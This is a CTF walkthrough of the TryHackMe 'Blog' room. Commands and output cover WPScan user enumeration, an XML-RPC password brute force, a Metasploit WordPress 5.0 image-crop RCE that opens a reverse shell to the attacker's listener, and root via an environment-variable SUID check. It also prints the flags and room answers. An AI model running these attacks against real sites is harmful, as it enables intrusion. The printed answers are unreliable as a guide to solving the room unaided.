# Blog — TryHackMe Walkthrough

> Billy Joel made a Wordpress blog! Enumerate this box and find the 2 flags that are hiding on it!

<p align="center">
  <a href="https://ibb.co/XkCNt2J7"><img src="https://i.ibb.co/Wp2qfxKk/618f1cc93596ff4082250bce9d869767.png" alt="618f1cc93596ff4082250bce9d869767" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/blog">
    <img src="https://img.shields.io/badge/TryHackMe-Blog-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-WordPress%20%7C%20CVE%20%7C%20SUID%20%7C%20ltrace-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | WordPress Enumeration (WPScan) |
| 3 | WordPress Credential Brute Force |
| 4 | Metasploit — `wp_crop_rce` (WordPress 5.0 Image Crop RCE) |
| 5 | Abusing SUID Binary — Custom `checker` binary |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform a network scan and identify a WordPress installation
- Use WPScan to enumerate WordPress users and brute-force credentials
- Exploit a known RCE vulnerability in WordPress 5.0 using Metasploit
- Identify unusual SUID binaries and use `ltrace` to reverse engineer their behaviour
- Manipulate environment variables to satisfy binary checks and escalate to root
- Locate a flag hidden on a mounted USB device rather than in the expected location

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, WPScan, Metasploit, and `ltrace` installed
- Add `Machine_IP blog.thm` to `/etc/hosts` before starting — the blog requires virtual host routing
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)
- Archive Password: `1 kn0w 1 5h0uldn'7!`

---

## Task 1 — Blog

---

### Step 1 — /etc/hosts Configuration

**Approach:** Before scanning, add the target to your hosts file so `blog.thm` resolves correctly.

```
echo "Machine_IP blog.thm" | sudo tee -a /etc/hosts
```

> **Note:** This machine uses virtual host routing — the web server only serves the WordPress blog when the HTTP `Host` header is set to `blog.thm`. Without this hosts file entry, browsing to the IP directly will not show the correct site.

---

### Step 2 — Network Enumeration

**Approach:** Run an aggressive Nmap scan against `blog.thm` to identify all open ports and services.

```
kali@kali:~/CTFs/tryhackme/Blog$ sudo nmap -A -sS -sC -sV -O blog.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 16:46 CEST
Nmap scan report for blog.thm (Machine_IP)
Host is up (0.032s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.81 seconds
```

> **Note:** Four ports are open. Nmap's `http-generator` header immediately identifies the site as **WordPress 5.0** — a version with a known Remote Code Execution vulnerability. SMB is also running, though the main attack vector here is through WordPress. Port 80's `robots.txt` already discloses `/wp-admin/` as expected.

---

### Step 3 — WordPress Enumeration with WPScan

**Approach:** Use WPScan to enumerate users, version details, and security misconfigurations on the WordPress installation.

```
kali@kali:~/CTFs/tryhackme/Blog$ wpscan --url http://blog.thm --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
_______________________________________________________________

[+] URL: http://blog.thm/ [Machine_IP]
[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/

[+] Enumerating Users (via Passive and Aggressive Methods)

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By: Wp Json Api (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By: Wp Json Api (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)

[+] Finished: Sun Oct 11 16:50:19 2020
```

> **Note:** WPScan identifies **WordPress 5.0** (flagged as insecure) and enumerates two login usernames: **`kwheel`** and **`bjoel`** — corresponding to Karen Wheeler and Billy Joel. XML-RPC is enabled, which allows WPScan to brute-force passwords much faster than attacking the login form directly. Save both usernames to a file called `wp_user.txt` for the next step.

---

### Step 4 — WordPress Password Brute Force

**Approach:** Run WPScan again with the `-U` flag pointing to the user list and `-P` pointing to `rockyou.txt` to brute-force passwords via the XML-RPC endpoint.

```
kali@kali:~/CTFs/tryhackme/Blog$ wpscan -U wp_user.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.thm

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - kwheel / cutiepie1
```

> **Note:** WPScan cracks the password for **`kwheel`** as **`cutiepie1`**. Note that `bjoel`'s password is not cracked — only `kwheel` has a weak enough password to appear in `rockyou.txt`. These credentials are: **`kwheel:cutiepie1`**.

---

### Step 5 — Exploiting WordPress 5.0 RCE via Metasploit

**Approach:** WordPress 5.0 is vulnerable to an authenticated Remote Code Execution via the image crop functionality. Use the Metasploit module `exploit/multi/http/wp_crop_rce` with the cracked credentials to gain a Meterpreter shell.

```
kali@kali:~/CTFs/tryhackme/Blog$ msfconsole -q
msf5 > use exploit/multi/http/wp_crop_rce
msf5 exploit(multi/http/wp_crop_rce) > set rhost blog.thm
rhost => blog.thm
msf5 exploit(multi/http/wp_crop_rce) > set username kwheel
username => kwheel
msf5 exploit(multi/http/wp_crop_rce) > set password cutiepie1
password => cutiepie1
msf5 exploit(multi/http/wp_crop_rce) > set LHOST YOUR_IP
LHOST => YOUR_IP
msf5 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on YOUR_IP:4444
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (38288 bytes) to Machine_IP
[*] Meterpreter session 1 opened (YOUR_IP:4444 -> Machine_IP:33948)
[*] Attempting to clean up files...

meterpreter > shell
Process 1626 created.
Channel 1 created.
SHELL=/bin/bash script -q /dev/null
www-data@blog:/var/www/wordpress$ whoami
www-data
```

> **Note:** The exploit authenticates as `kwheel`, uploads a malicious image payload via the WordPress media crop feature, includes it through the theme engine to execute it, and opens a reverse shell. The `SHELL=/bin/bash script -q /dev/null` trick upgrades the basic shell to a full interactive bash session. We land as `www-data` — the web server user.

---

### Step 6 — Finding and Analysing the Custom SUID Binary

**Approach:** Search for SUID binaries. One unusual custom binary — `/usr/sbin/checker` — stands out. Use `ltrace` to trace its library calls and understand what it checks.

```
www-data@blog:/var/www/wordpress$ find / -type f -user root -perm -u=s 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
...
/usr/sbin/checker
...
www-data@blog:/var/www/wordpress$ file /usr/sbin/checker
/usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked
www-data@blog:/var/www/wordpress$ ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

> **Note:** `/usr/sbin/checker` is a custom SUID binary not found in standard Linux distributions. `ltrace` traces library calls — it shows `getenv("admin")` returning `nil`, then printing "Not an Admin" and exiting. This tells us the binary checks for an environment variable called `admin`. If `admin` is set to any value, it will presumably take a different path. Set it and run the binary again.

---

### Step 7 — Exploiting the checker Binary and Reading the Flags

**Approach:** Set the `admin` environment variable to any value, then execute `checker` to gain a root shell.

```
www-data@blog:/var/www/wordpress$ export admin=1
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
root@blog:/var/www/wordpress# cd /root
root@blog:/root# ls
root.txt
root@blog:/root# cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```

> **Note:** Setting `export admin=1` causes `getenv("admin")` to return a non-null value. The binary then spawns a root shell — most likely via `setuid(0)` followed by `execvp("/bin/sh", ...)` or similar. This is the kind of check a developer might add thinking it provides security, but since the environment is fully controllable by the calling user, it provides no protection whatsoever.

**Finding user.txt — the rabbit hole:**

```
root@blog:/root# find / -type f -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
root@blog:/root# cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```

> **Note:** There are two `user.txt` files. The one in `/home/bjoel/user.txt` is the **rabbit hole** — it contains a fake message. The real user flag is on a mounted USB device at `/media/usb/user.txt`. This is the room's deliberate misdirection — always search the entire filesystem with `find` rather than assuming flags are in standard locations.

---

### Question 1 — root.txt

<details>
<summary>Reveal Answer</summary>

**`9a0b2b618bef9bfa7ac28c1353d9f318`**

</details>

---

### Question 2 — user.txt

<details>
<summary>Reveal Answer</summary>

**`c8421899aae571f7af486492b71a8ab7`**

</details>

---

### Question 3 — Where was user.txt found?

<details>
<summary>Reveal Answer</summary>

**`/media/usb`**

</details>

---

### Question 4 — What CMS was Billy using?

<details>
<summary>Reveal Answer</summary>

**`WordPress`**

</details>

---

### Question 5 — What version of the above CMS was being used?

<details>
<summary>Reveal Answer</summary>

**`5.0`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | `/etc/hosts` configuration | Mapped `Machine_IP` to `blog.thm` |
| 2 | Nmap scan | Found SSH (22), WordPress 5.0 on HTTP (80), SMB (139/445) |
| 3 | WPScan user enumeration | Identified users `kwheel` and `bjoel` |
| 4 | WPScan XML-RPC password brute-force | Cracked `kwheel:cutiepie1` |
| 5 | Metasploit `wp_crop_rce` exploit | Gained Meterpreter shell as `www-data` |
| 6 | SUID binary search | Found custom `/usr/sbin/checker` binary |
| 7 | `ltrace /usr/sbin/checker` | Revealed `getenv("admin")` check |
| 8 | `export admin=1` then run checker | Spawned root shell |
| 9 | Read `root.txt` | Found root flag in `/root/` |
| 10 | `find` for `user.txt` | Discovered real flag at `/media/usb/user.txt` (not the rabbit hole in `/home/bjoel/`) |
